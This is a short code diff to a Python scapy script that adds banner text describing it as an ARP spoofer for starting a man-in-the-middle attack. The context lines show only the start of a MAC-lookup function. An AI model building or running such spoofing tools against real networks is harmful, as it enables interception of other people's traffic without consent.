@@ -4,6 +4,9 @@ import scapy.all as scapy
 import time
 import sys
 
+print("This script is created by AN0N1M0U5\nARP-Spoofer for starting MITM attack. Just insert target and gateway IP to start spoofing!")
+print("\n\n")
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
